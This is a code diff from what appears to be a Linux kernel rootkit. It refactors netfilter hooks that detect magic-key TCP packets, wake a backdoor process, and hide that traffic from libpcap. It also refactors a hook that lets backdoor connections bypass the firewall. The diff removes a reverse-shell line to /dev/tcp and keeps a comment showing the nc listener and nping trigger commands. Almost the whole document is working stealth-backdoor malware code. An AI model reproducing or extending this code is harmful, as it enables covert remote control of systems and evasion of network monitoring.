@@ -221,7 +221,6 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * nc <IP> -lvp <#PORT>
                      * trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    //"/bin/sh -i >& /dev/tcp/%s/%s 0>&1";
                     int len;
                     char ip[INET_ADDRSTRLEN+1] = {0};
                     snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
@@ -482,45 +481,41 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
         const struct nf_hook_state *state) {
     int rc = NF_ACCEPT;
     struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
-    switch (iph->protocol) {
-        case IPPROTO_TCP: {
-                struct nf_priv *user;
-                struct kfifo_priv *kf;
 
-                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
-                int dst = _check_bdports(htons(tcph->dest));
+    if (iph && IPPROTO_TCP == iph->protocol) {
+        struct nf_priv *user;
+        struct kfifo_priv *kf;
+        struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
+        int dst = _check_bdports(htons(tcph->dest));
 
-                /** Silence libpcap on CUNT/ASS/FUCK */
-                if (dst == RR_NULL || !kv_check_bdkey(tcph, skb)) break;
+        /** Silence libpcap? */
+        if (dst == RR_NULL || !kv_check_bdkey(tcph, skb))
+            goto leave;
 
-                kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
-                if (!kf) {
-                    prerr("Insufficient memory\n");
-                    break;
-                }
+        kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
+        if (!kf) {
+            prerr("Insufficient memory\n");
+            goto leave;
+        }
 
-                kf->iph = iph;
-                kf->tcph = tcph;
-                kf->select = dst;
+        kf->iph = iph;
+        kf->tcph = tcph;
+        kf->select = dst;
 
-                /** setup data so can be read from backdoor code */
-                _put_fifo(kf);
+        /** setup data so can be read from backdoor code */
+        _put_fifo(kf);
 
-                /* Make sure we don't show in libcap */
-                _bd_add_new_iph(iph, tcph);
+        /* Make sure we don't show in libcap */
+        _bd_add_new_iph(iph, tcph);
 
-                user = (struct nf_priv*)priv;
-                wake_up_process(user->task);
+        user = (struct nf_priv*)priv;
+        wake_up_process(user->task);
 
-                /** make less noise, drop it here */
-                rc = NF_DROP;
-            }
-            break;
-        case IPPROTO_UDP:
-            break;
-        default:
-            break;
+        /** make less noise, drop it here */
+        rc = NF_DROP;
     }
+
+leave:
     return rc;
 }
 
@@ -558,28 +553,24 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
         const struct nf_hook_state *state) {
     int rc = NF_ACCEPT;
     struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
-    switch (iph->protocol) {
-        case IPPROTO_TCP: {
-                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
-                int dstport = htons(tcph->dest);
-                /*
-                 * The `sk_state` in include/net/tcp_states.h represents the current connection state of a packet.
-                 * When a packet is in the TCP_ESTABLISHED state, it signifies that the connection has completed.
-                 * This information is crucial for retaining the state and addresses of this connection, which is
-                 * stored throughout the lifetime of the backdoor.
-                 */
-                if (kv_bd_established(&iph->daddr,
-                            dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
-                    /**
-                     * Kick this packet out to the wire yay!
-                     */
-                    state->okfn(state->net, state->sk, skb);
-                    rc = NF_STOLEN;
-                }
-            }
-            break;
-        default:
-            break;
+
+    if (IPPROTO_TCP == iph->protocol) {
+        struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
+        int dstport = htons(tcph->dest);
+        /*
+         * The `sk_state` in include/net/tcp_states.h represents the current connection state of a packet.
+         * When a packet is in the TCP_ESTABLISHED state, it signifies that the connection has completed.
+         * This information is crucial for retaining the state and addresses of this connection, which is
+         * stored throughout the lifetime of the backdoor.
+         */
+        if (kv_bd_established(&iph->daddr,
+                    dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
+            /**
+             * Kick this packet out to the wire yay!
+             */
+            state->okfn(state->net, state->sk, skb);
+            rc = NF_STOLEN;
+        }
     }
     return rc;
 }
